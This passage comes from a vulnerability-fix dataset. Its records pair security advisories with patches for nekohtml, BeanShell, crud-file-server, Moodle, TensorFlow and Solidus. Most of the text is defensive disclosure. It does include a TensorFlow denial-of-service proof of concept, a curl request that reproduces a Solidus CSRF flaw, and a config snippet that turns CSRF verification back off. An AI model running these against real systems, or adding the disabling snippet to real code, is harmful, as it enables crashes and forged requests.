information.\n\nPlease note that this advisory only applies to the **JRuby** implementation of Nokogiri `< 1.13.4`.\n\n\n## Mitigation\n\nUpgrade to Nokogiri `>= 1.13.4`.\n\n\n## Impact\n\n### [CVE-2022-24839](https:\/\/github.com\/sparklemotion\/nekohtml\/security\/advisories\/GHSA-9849-p7jc-9rmv) in nekohtml\n\n- **Severity**: High 7.5\n- **Type**: [CWE-400](https:\/\/cwe.mitre.org\/data\/definitions\/400.html) Uncontrolled Resource Consumption\n- **Description**: The fork of `org.cyberneko.html` used by Nokogiri (Rubygem) raises a `java.lang.OutOfMemoryError` exception when parsing ill-formed HTML markup.\n- **See also**: [GHSA-9849-p7jc-9rmv](https:\/\/github.com\/sparklemotion\/nekohtml\/security\/advisories\/GHSA-9849-p7jc-9rmv)","published_date":"2022-04-11","chain_len":1,"project":"https:\/\/github.com\/sparklemotion\/nekohtml","commit_href":"https:\/\/github.com\/sparklemotion\/nekohtml\/commit\/a800fce3b079def130ed42a408ff1d09f89e773d","commit_sha":"a800fce3b079def130ed42a408ff1d09f89e773d","patch":"SINGLE","chain_ord":"['a800fce3b079def130ed42a408ff1d09f89e773d']","before_first_fix_commit":"{'6fe9b53bc289d0e90d684c0f4a8e9f2b19f3460f'}","last_fix_commit":"a800fce3b079def130ed42a408ff1d09f89e773d","chain_ord_pos":1.0,"commit_datetime":"04\/03\/2022, 23:03:39","message":"fix: ensure ill-formed PIs are parsed correctly","author":"Mike Dalessio","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/org\/cyberneko\/html\/HTMLScanner.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sparklemotion\/nekohtml\/raw\/a800fce3b079def130ed42a408ff1d09f89e773d\/src%2Forg%2Fcyberneko%2Fhtml%2FHTMLScanner.java', 'patch': \"@@ -2588,7 +2588,7 @@ protected void scanPI() throws IOException {\\n                     if (c == '?' || c == '\/') {\\n                         char c0 = (char)c;\\n                         c = fCurrentEntity.read();\\n-                        if (c == '>') {\\n+                        if (c == '>' || c == -1) {\\n                             break;\\n                         }\\n                         fStringBuffer.append(c0);\"}}","message_norm":"fix: ensure ill-formed pis are parsed correctly","language":"en","entities":"[('fix', 'ACTION', ''), ('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/org\/cyberneko\/html\/HTMLScanner.java'])","num_files":1.0},{"index":1954,"vuln_id":"GHSA-gxg6-rc6c-v673","cwe_id":"{'CWE-20'}","score":8.1,"chain":"{'https:\/\/github.com\/beanshell\/beanshell\/commit\/7c68fde2d6fc65e362f20863d868c112a90a9b49', 'https:\/\/github.com\/beanshell\/beanshell\/commit\/1ccc66bb693d4e46a34a904db8eeff07808d2ced'}","dataset":"osv","summary":"Improper Input Validation in BeanShell BeanShell (bsh) before 2.0b6, when included on the classpath by an application that uses Java serialization or XStream, allows remote attackers to execute arbitrary code via crafted serialized data, related to XThis.Handler.","published_date":"2022-05-13","chain_len":2,"project":"https:\/\/github.com\/beanshell\/beanshell","commit_href":"https:\/\/github.com\/beanshell\/beanshell\/commit\/7c68fde2d6fc65e362f20863d868c112a90a9b49","commit_sha":"7c68fde2d6fc65e362f20863d868c112a90a9b49","patch":"MULTI","chain_ord":"['1ccc66bb693d4e46a34a904db8eeff07808d2ced', '7c68fde2d6fc65e362f20863d868c112a90a9b49']","before_first_fix_commit":"{'1ccc66bb693d4e46a34a904db8eeff07808d2ced'}","last_fix_commit":"7c68fde2d6fc65e362f20863d868c112a90a9b49","chain_ord_pos":2.0,"commit_datetime":"02\/03\/2016, 01:03:20","message":"Prevent deserialization of Handler","author":"Stian Soiland-Reyes","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/bsh\/XThis.java': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/beanshell\/beanshell\/raw\/7c68fde2d6fc65e362f20863d868c112a90a9b49\/src%2Fbsh%2FXThis.java', 'patch': '@@ -118,6 +118,10 @@ interface from JDK1.2 VM...\\n \\t*\/\\n \\tclass Handler implements InvocationHandler\\n \\t{\\n+\\t\\tprivate Object readResolve() throws ObjectStreamException {\\n+\\t\\t\\tthrow new NotSerializableException();\\n+\\t\\t}\\n+\\n \\t\\tpublic Object invoke( Object proxy, Method method, Object[] args )\\n \\t\\t\\tthrows Throwable\\n \\t\\t{'}}","message_norm":"prevent deserialization of handler","language":"en","entities":"[('prevent', 'ACTION', ''), ('deserialization', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/bsh\/XThis.java'])","num_files":1.0},{"index":1959,"vuln_id":"GHSA-h24f-9mm4-w336","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/omphalos\/crud-file-server\/commit\/4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa'}","dataset":"osv","summary":"Cross-site Scripting (XSS) - Stored in crud-file-server Versions of `crud-file-server` before 0.8.0 are vulnerable to stored cross-site scripting (XSS). This is due to insufficient santiziation of filenames when directory index is served by `crud-file-server`.\n\n\n## Recommendation\n\nUpdate to version 0.8.0 or later.","published_date":"2018-07-18","chain_len":1,"project":"https:\/\/github.com\/omphalos\/crud-file-server","commit_href":"https:\/\/github.com\/omphalos\/crud-file-server\/commit\/4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa","commit_sha":"4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa","patch":"SINGLE","chain_ord":"['4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa']","before_first_fix_commit":"{'0c45fc64f0c0aeb23fe515c95e29f6485803de65'}","last_fix_commit":"4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa","chain_ord_pos":1.0,"commit_datetime":"02\/14\/2018, 23:29:21","message":"Fix not sanitizing file names rendered in html","author":"omphalos","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'crud-file-server.js': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/omphalos\/crud-file-server\/raw\/4155bfe068bf211b49a0b3ffd06e78cbaf1b40fa\/crud-file-server.js', 'patch': '@@ -140,7 +140,9 @@ exports.handleRequest = function(vpath, path, req, res, readOnly, logHeadRequest\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tvar name = results[f].name;\\r\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tvar normalized = url + \\'\/\\' + name;\\r\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\twhile(normalized[0] == \\'\/\\') { normalized = normalized.slice(1, normalized.length); }\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tres.write(\\'\\\\r\\\\n<p><a href=\"\/\\' + normalized + \\'\">\\' + name + \\'<\/a><\/p>\\');\\r\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tif(normalized.indexOf(\\'\"\\') >= 0) throw new Error(\\'unsupported file name\\')\\r\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tname = name.replace(\/&\/g, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\');\\r\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tres.write(\\'\\\\r\\\\n<p><a href=\"\/\\' + normalized + \\'\"><span>\\' + name + \\'<\/span><\/a><\/p>\\');\\r\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t}\\r\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tres.end(\\'\\\\r\\\\n<\/body><\/html>\\');\\r\\n \\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t}'}}","message_norm":"fix not sanitizing file names rendered in html","language":"en","entities":"[('sanitizing', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['crud-file-server.js'])","num_files":1.0},{"index":1964,"vuln_id":"GHSA-h2fw-93qx-vrcq","cwe_id":"{'CWE-89'}","score":8.8,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/c2794752ea3cdda2d64a0651da08b2cdf730d9f1'}","dataset":"osv","summary":"SQL Injection in Moodle An SQL injection risk was identified in Badges code relating to configuring criteria. Access to the relevant capability was limited to teachers and managers by default.","published_date":"2022-03-26","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/c2794752ea3cdda2d64a0651da08b2cdf730d9f1","commit_sha":"c2794752ea3cdda2d64a0651da08b2cdf730d9f1","patch":"SINGLE","chain_ord":"['c2794752ea3cdda2d64a0651da08b2cdf730d9f1']","before_first_fix_commit":"{'addd4f894d8173ec8ff0ae2212d51a1977e7bcad'}","last_fix_commit":"c2794752ea3cdda2d64a0651da08b2cdf730d9f1","chain_ord_pos":1.0,"commit_datetime":"03\/03\/2022, 18:02:15","message":"MDL-74074 badges: Ensure profile criteria exists before completion check","author":"Michael Hawkins","comments":null,"stats":"{'additions': 23, 'deletions': 6, 'total': 29}","files":"{'badges\/criteria\/award_criteria_profile.php': {'additions': 23, 'deletions': 6, 'changes': 29, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/c2794752ea3cdda2d64a0651da08b2cdf730d9f1\/badges%2Fcriteria%2Faward_criteria_profile.php', 'patch': '@@ -39,6 +39,26 @@ class award_criteria_profile extends award_criteria {\\n     public $required_param = \\'field\\';\\n     public $optional_params = array();\\n \\n+    \/* @var array The default profile fields allowed to be used as award criteria.\\n+     *\\n+     * Note: This is used instead of user_get_default_fields(), because it is not possible to\\n+     * determine which fields the user can modify.\\n+     *\/\\n+    protected $allowed_default_fields = [\\n+        \\'firstname\\',\\n+        \\'lastname\\',\\n+        \\'email\\',\\n+        \\'address\\',\\n+        \\'phone1\\',\\n+        \\'phone2\\',\\n+        \\'department\\',\\n+        \\'institution\\',\\n+        \\'description\\',\\n+        \\'picture\\',\\n+        \\'city\\',\\n+        \\'country\\',\\n+    ];\\n+\\n     \/**\\n      * Add appropriate new criteria options to the form\\n      *\\n@@ -50,10 +70,7 @@ public function get_options(&$mform) {\\n         $none = true;\\n         $existing = array();\\n         $missing = array();\\n-\\n-        \/\/ Note: cannot use user_get_default_fields() here because it is not possible to decide which fields user can modify.\\n-        $dfields = array(\\'firstname\\', \\'lastname\\', \\'email\\', \\'address\\', \\'phone1\\', \\'phone2\\',\\n-                         \\'department\\', \\'institution\\', \\'description\\', \\'picture\\', \\'city\\', \\'country\\');\\n+        $dfields = $this->allowed_default_fields;\\n \\n         \/\/ Get custom fields.\\n         $cfields = array_filter(profile_get_custom_fields(), function($field) {\\n@@ -230,8 +247,8 @@ public function get_completed_criteria_sql() {\\n                 $join .= \" LEFT JOIN {user_info_data} uid{$idx} ON uid{$idx}.userid = u.id AND uid{$idx}.fieldid = :fieldid{$idx} \";\\n                 $params[\"fieldid{$idx}\"] = $param[\\'field\\'];\\n                 $whereparts[] = \"uid{$idx}.id IS NOT NULL\";\\n-            } else {\\n-                \/\/ This is a field from {user} table.\\n+            } else if (in_array($param[\\'field\\'], $this->allowed_default_fields)) {\\n+                \/\/ This is a valid field from {user} table.\\n                 if ($param[\\'field\\'] == \\'picture\\') {\\n                     \/\/ The picture field is numeric and requires special handling.\\n                     $whereparts[] = \"u.{$param[\\'field\\']} != 0\";'}}","message_norm":"mdl-74074 badges: ensure profile criteria exists before completion check","language":"en","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['badges\/criteria\/award_criteria_profile.php'])","num_files":1.0},{"index":1966,"vuln_id":"GHSA-h2wq-prv9-2f56","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58'}","dataset":"osv","summary":"Missing validation crashes `QuantizeAndDequantizeV4Grad` ### Impact\nThe implementation of [`tf.raw_ops.QuantizeAndDequantizeV4Grad`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f3b9bf4c3c0597563b289c0512e98d4ce81f886e\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L148-L226) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input=tf.constant(1, shape=[2,2], dtype=tf.float64),\n  input_min=tf.constant([], shape=[0], dtype=tf.float64),\n  input_max=tf.constant(-10, shape=[], dtype=tf.float64),\n  axis=-1)\n```\n\nThe code assumes `input_min` and `input_max` are scalars but there is no validation for this.\n\n### Patches\nWe have patched the issue in GitHub commit [098e7762d909bac47ce1dbabe6dfd06294cb9d58](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.","published_date":"2022-05-24","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/098e7762d909bac47ce1dbabe6dfd06294cb9d58","commit_sha":"098e7762d909bac47ce1dbabe6dfd06294cb9d58","patch":"SINGLE","chain_ord":"['098e7762d909bac47ce1dbabe6dfd06294cb9d58']","before_first_fix_commit":"{'e505acc64062d9250ad4452ce57529bed8fd2160'}","last_fix_commit":"098e7762d909bac47ce1dbabe6dfd06294cb9d58","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 18:06:02","message":"Fix tf.raw_ops.QuantizeAndDequantizeV4Grad vulnerability with invalid input_min or input_max.\n\nCheck that argument is actually a scalar before treating it as such.\n\nPiperOrigin-RevId: 445198280","author":"Alan Liu","comments":null,"stats":"{'additions': 8, 'deletions': 2, 'total': 10}","files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 8, 'deletions': 2, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/098e7762d909bac47ce1dbabe6dfd06294cb9d58\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -174,13 +174,13 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n     OP_REQUIRES(ctx,\\n                 input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input min tensor must have dimension 1. Recieved \",\\n+                    \"Input min tensor must have dimension 0 or 1. Received \",\\n                     input_min_tensor.dims(), \".\"));\\n     const Tensor& input_max_tensor = ctx->input(3);\\n     OP_REQUIRES(ctx,\\n                 input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\\n                 errors::InvalidArgument(\\n-                    \"Input max tensor must have dimension 1. Recieved \",\\n+                    \"Input max tensor must have dimension 0 or 1. Received \",\\n                     input_max_tensor.dims(), \".\"));\\n     if (axis_ != -1) {\\n       OP_REQUIRES(\\n@@ -203,6 +203,12 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n                    ctx->allocate_output(2, min_max_shape, &input_max_backprop));\\n \\n     if (axis_ == -1) {\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_min_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_min must be a scalar if axis is unspecified\"));\\n+      OP_REQUIRES(ctx, TensorShapeUtils::IsScalar(input_max_tensor.shape()),\\n+                  errors::InvalidArgument(\\n+                      \"input_max must be a scalar if axis is unspecified\"));\\n       functor::QuantizeAndDequantizeOneScaleGradientFunctor<Device, T> f;\\n       f(ctx->eigen_device<Device>(), gradient.template flat<T>(),\\n         input.template flat<T>(), input_min_tensor.scalar<T>(),'}}","message_norm":"fix tf.raw_ops.quantizeanddequantizev4grad vulnerability with invalid input_min or input_max.\n\ncheck that argument is actually a scalar before treating it as such.\n\npiperorigin-revid: 445198280","language":"en","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', ''), ('445198280', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])","num_files":1.0},{"index":1972,"vuln_id":"GHSA-h3fg-h5v3-vf8m","cwe_id":"{'CWE-352'}","score":5.3,"chain":"{'https:\/\/github.com\/solidusio\/solidus\/commit\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6', 'https:\/\/github.com\/solidusio\/solidus\/commit\/4d17cacf066d9492fc04eb3a0b16084b47376d81'}","dataset":"osv","summary":"CSRF forgery protection bypass in solidus_frontend ### Impact\nCSRF vulnerability that allows a malicious site to add an item to the user's cart without their knowledge.\n\nAll `solidus_frontend` versions are affected. If you're using your own storefront, please, follow along to make sure you're not affected.\n\nTo reproduce the issue:\n\n- Pick the id for a variant with available stock. From the rails console:\n\n  ```ruby\n  Spree::Variant.in_stock.pluck(:id)\n  ```\n\n  Say we pick variant id `2`.\n\n- Launch your application, for instance, on `http:\/\/localhost:3000`:\n\n  ```bash\n  bin\/rails server\n  ```\n\n- Open your browser dev tools.\n\n- Click on whatever link in your store.\n\n- Copy the value of the `Cookie` request header sent for the previous request from your browser dev tools.\n\n- Execute the following, using your previously selected variant id and the value of the `Cookie` header (notice how it doesn't contain any authentication token):\n\n  ```bash\n  curl -X POST -d \"variant_id=2&quantity=1\" -H \"Cookie: guest_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklrWlRVMWRQWnpKMVZVdFNXRzlPVW1aaWJHTjZZa0VpIiwiZXhwIjpudWxsLCJwdXIiOiJjb29raWUuZ3Vlc3RfdG9rZW4ifX0%3D--5006ba5d346f621c760a29b6a797bf351d17d1b8; _sandbox_session=vhutu5%2FL9NmWrUpGc3DxrFA%2FFsQD1dHn1cNsD7nvE84zcjWf17Af4%2F%2F2Vab3md71b6KTb9NP6WktdXktpwH4eU01jEGIBXG5%2BMzW5nL0nb4W269qk1io4LYljvoOg8%2BZVll7oJCVkJLKKh0sSoS0Kg8j%2FCHHs%2BsShohP%2BGnA%2Bfr9Ub8H6HofpSmloSpsfHHygmX0ho03fEgzHJ4DD5wJctaNKwg7NhVikHh5kgIPPHl84OGCgv3p2oe9jR19HTxOKq7BtyvDd7XZsecWhkcfS8BPnvDDUWZG6qpAEFI5kWo81KkpSJ%2Bp6Q1HOo8%3D--n3G2vgaDG7VS%2B%2FhF--ZTjxBAkfGG3hpr4GRQ2S1Q%3D%3D; __profilin=p%3Dt\" http:\/\/localhost:3000\/orders\/populate\n  ```\n\n- Reload your browser and look at how your cart got updated.\n\n### Patches\n\nPlease, upgrade `solidus` to versions `3.1.5`, `3.0.5` or `2.11.14`.\n\nAfter upgrading, make sure you read the \"Upgrade notes\"  section below.\n\n### Upgrade notes\n\nThe patch adds CSRF token verification to the \"Add to cart\" action. Adding forgery protection to a form that missed it can have some side effects.\n\n#### `InvalidAuthenticityToken` errors\n\nIf you're using the `:exception` strategy, it's likely that after upgrading, you'll see more `ActionController::InvalidAuthenticityToken` errors popping out in your logs. Due to browser-side cache, a form can be re-rendered and sent without any attached request cookie (for instance, when re-opening a mobile browser). That will cause an authentication error, as the sent token won't match with the one in the session (none in this case). That's a known problem in the Rails community (see https:\/\/github.com\/rails\/rails\/issues\/21948), and, at this point, there's no perfect solution.\n\nAny attempt to mitigate the issue should be seen at the application level. For an excellent survey of all the available options, take a look at https:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md. The latter is a third-party link. As the information is relevant here, we're going to copy it below, but it should be clear that all the credit goes to @kemenaran:\n\n> # Protecting against request forgery using CRSF tokens\n> \n> ## Context\n> \n> Rails has CSRF protection enabled by default, to protect against POST-based CSRF attacks.\n> \n> To protect from this, Rails stores two copies of a random token (the so-named CSRF token) on each request:\n> - one copy embedded in each HTML page,\n> - another copy in the user session.\n> \n> When performing a POST request, Rails checks that the two copies match \u2013 and otherwise denies the request. This protects against an attacker that would generate a form secretly pointing to our website: the attacker can't read the token in the session, and so can't post a form with a valid token.\n> \n> The problem is that, much more often, this has false positives. There are several cases for that, including:\n> \n> 1. The web browser (often mobile) loads a page containing a form, then is closed by the user. Later, when the browser is re-opened, it restores the page from the cache. But the session cookie has expired, and so is not restored \u2013 so the copy of the CSRF token stored in the session is missing. When the user submits the form, they get an \"InvalidAuthenticityToken\" exception.\n> \n> 2. The user attempts to fill a form, and gets an error message (usually in response to a POST request). They close the browser. When the browser is re-opened, it attempts to restore the page. On Chrome this is blocked by the browser, because the browser denies retrying a (probably non-idempotent) POST request. Safari however happily retries the POST request \u2013 but without sending any cookies (in an attempt to avoid having unexpected side-effects). So the copy of the CSRF token in the session is missing (because no cookie was sent), and the user get an \"InvalidAuthenticityToken\" exception.\n> \n> ## Options considered\n> \n> ### Extend the session cookie duration\n> \n> We can configure the session cookie to be valid for a longer time (like 2 weeks).\n> \n> Pros:\n> - It solves 1., because when the browser restores the page, the session cookie is still valid.\n> \n> Cons:\n> - Users would be signed-in for a much longer time by default, which has unacceptable security implications.\n> - It doesn't solve 2. (because Safari doesn't send any cookie when restoring a page from a POST request)\n> \n> ### Change the cache parameters\n> \n> We can send a HTTP cache header stating 'Cache-Control: no-store, no-cache'. This instructs the browser to never keep any copy of the page, and to always make a request to the server to restore it.\n> \n> This solution was attempted during a year in production, and solved 1. \u2013 but also introduced another type of InvalidAuthenticityToken errors. In that scenario, the user attempts to fill a form, and gets an error message (usually in response to a POST request). They then navigate on another domain (like France Connect), then hit the \"Back\" button. Crossing back the domain boundary may cause the browser to either block the request or retry an invalid POST request.\n> \n> Pros:\n> - It solves 1., because on relaunch the browser requests a fresh page again (instead of serving it from its cache), thus retrieving a fresh session and a fresh matching CSRF token.\n> \n> Cons:\n> - It doesn't solve 2.\n> - It causes another type of InvalidAuthenticityToken errors.\n> \n> ### Using a null-session strategy\n> \n> We can change the default protect_from_forgery strategy to :null_session. This makes the current request use an empty session for the request duration.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - The user is asked to sign-in only after filling and submitting the form, losing their time and data\n> - The user will not be redirected to their original page after signing-in\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> \n> ### Using a reset-session strategy\n> \n> We can change the default protect_from_forgery strategy to :reset_session. This clears the user session permanently, logging them out until they log in again.\n> \n> Pros: \n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted.\n> \n> Cons:\n> - A forgery error in a browser tab will disconnect the user in all its open tabs\n> - It has potential security implications: as the (potentically malicious) request runs anyway, variables cached by a controller before the Null session is created may allow the form submission to succeed anyway (https:\/\/www.veracode.com\/blog\/managing-appsec\/when-rails-protectfromforgery-fails)\n> - It allows an attacker to disconnect an user on demand, which is not only inconvenient, but also has security implication (the attacker could then log the user on it's own attacker account, pretending to be the user account)\n> \n> ### Redirect to login form\n> \n> When a forgery error occurs, we can instead redirect to the login form.\n> \n> Pros:\n> - It kind of solves 1., by redirecting to a \"Please sign-in\" page when a stale form is submitted (but the user data is lost).\n> - It kind of solves 2., by redirecting to a \"Please sign-in\" page when a previously POSTed form is reloaded.\n> \n> Cons:\n> - Not all forms require authentication \u2013 so for public forms there is no point redirecting to the login form. \n> - The user will not be redirected to their original page after signing-in (because setting the redirect path is a state-changing action, and it is dangerous to let an unauthorized request changing the state \u2013 an attacker could control the path where an user is automatically redirected to.)\n> - The implementation is finicky, and may introduce security errors. For instance, a naive implementation that catches the exception and redirect_to the sign-in page will prevent Devise from running a cleanup code \u2013 which means the user will still be logged, and the CSRF protection is bypassed. However a well-tested implementation that lets Devise code run should avoid these pittfalls.\n> \n> ### Using a long-lived cookie for CSRF tokens\n> \n> Instead of storing the CSRF token in the session cookie (which is deleted when the browser is closed), we can instead store it in a longer-lived cookie. For this we need to patch Rails.\n> \n> Pros:\n> - It solves 1., because when the user submits a stale form, even if the session cookie because stale, the long-lived CSRF cookie is still valid.\n> \n> Cons:\n> - It doesn't solve 2., because when Safari retries a POST request, it sends none of the cookies (not even long-lived ones).\n> - Patching Rails may introduce security issues (now or in the future)\n\n#### Broken behavior due to session expiration + template cache\n\nAlthough pretty unlikely, you should make sure that your current setup for cache\/session expiration is compatible. The upgrade can break the addition of products to the cart if both:\n\n- The \"Add to cart\" form is being cached (usually along with the variant information).\n\n- A user session is reset at every or every few requests.\n\nThe token validation depends on the issuing and consuming sessions being the same. If a product page is cached with the token in it, it can become stale on a subsequent rendering if the session changes.\n\nTo check that you're safe, after having upgraded locally, go through the following steps:\n\n- Enable cache on dev mode:\n\n  ```bash\n  bin\/rails dev:cache\n  ```\n\n- Visit the page for a variant with stock.\n\n- Reload that page several times.\n\n- Click on the \"Add to cart\"  button.\n\n- Remember to rerun `bin\/rails dev:cache` to turn off cache again.\n\nNo error or session reset should happen.\n\nOtherwise, you can try with:\n\n- Revisiting how your session gets expired.\n- Changing the caching strategy to exclude the token.\n\n#### Using weaker CSRF protection strategies\n\nIt's also important to understand that a complete fix will only be in place when using the `:exception` forgery protection strategy. The `solidus_frontend` engine can't do pretty much anything otherwise. Using weaker CSRF strategies should be an informed and limited decision made by the application team. After the upgrade:\n\n- An app using `:null_session` should also be safe, but there will be side effects. That strategy runs with a null object session. As such, no order and no user is found on it. A new `cart` state order is created in the database, associated with no user. Next time the user visits the site, they won't find any difference in its cart state.\n\n- An app using `:reset_session` is not entirely safe. That strategy resets the session. That means that registered users will be logged out. Next time a user visits, they'll see the cart with the items added during the CSRF attack, although it won't be associated with their account in the case of registered users.\n\n#### Reversing the update\n\nIf you still want to deploy the upgraded version before changing your application code (if the latter is needed), you can add the following workaround to your `config\/application.rb` (however, take into account that you'll keep being vulnerable):\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.skip_before_action :verify_authenticity_token, only: [:populate]\nend\n```\n\n### Workarounds\n\nIf an upgrade is not an option, you can work around the issue by adding the following to `config\/application.rb`:\n\n```ruby\nconfig.after_initialize do\n  Spree::OrdersController.protect_from_forgery with: ApplicationController.forgery_protection_strategy.name.demodulize.underscore.to_sym, only: [:populate]\nend\n```\n\nHowever, go through the same safety check detailed on \"Upgrade notes\" above.\n\n### References\n\n- [CSRF on the Rails guides](https:\/\/guides.rubyonrails.org\/security.html#cross-site-request-forgery-csrf)\n- [How CSRF tokens are generated and validated on Rails](https:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef)\n- [Solidus security](https:\/\/solidus.io\/security\/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an [issue](https:\/\/github.com\/solidusio\/solidus\/issues) or a [discussion](https:\/\/github.com\/solidusio\/solidus\/discussions) in Solidus.\n* Email us at [security@solidus.io](mailto:security@soliidus.io)\n* Contact the core team on [Slack](http:\/\/slack.solidus.io\/)","published_date":"2022-01-06","chain_len":2,"project":"https:\/\/github.com\/solidusio\/solidus","commit_href":"https:\/\/github.com\/solidusio\/solidus\/commit\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6","commit_sha":"a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6","patch":"MULTI","chain_ord":"['4d17cacf066d9492fc04eb3a0b16084b47376d81', 'a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6']","before_first_fix_commit":"{'4d17cacf066d9492fc04eb3a0b16084b47376d81', 'c6b892696881f88d209efaedd8bb378e8261953f'}","last_fix_commit":"a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6","chain_ord_pos":2.0,"commit_datetime":"12\/20\/2021, 08:25:33","message":"Merge pull request from GHSA-h3fg-h5v3-vf8m\n\nProtect `Spree::OrdersController#populate` against CSRF attacks","author":"Marc Busqu\u00e9","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'frontend\/app\/controllers\/spree\/orders_controller.rb': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/solidusio\/solidus\/raw\/a1b9bf7f24f9b8684fc4d943eacb02b1926c77c6\/frontend%2Fapp%2Fcontrollers%2Fspree%2Forders_controller.rb', 'patch': \"@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\\n     before_action :assign_order, only: :update\\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\\n     around_action :lock_order, only: :update\\n-    skip_before_action :verify_authenticity_token, only: [:populate]\\n \\n     def show\\n       @order = Spree::Order.find_by!(number: params[:id])\"}}","message_norm":"merge pull request from ghsa-h3fg-h5v3-vf8m\n\nprotect `spree::orderscontroller#populate` against csrf attacks","language":"en","entities":"[('ghsa-h3fg-h5v3-vf8m', 'VULNID', 'GHSA'), ('protect', 'ACTION', ''), ('csrf', 'SECWORD', ''), 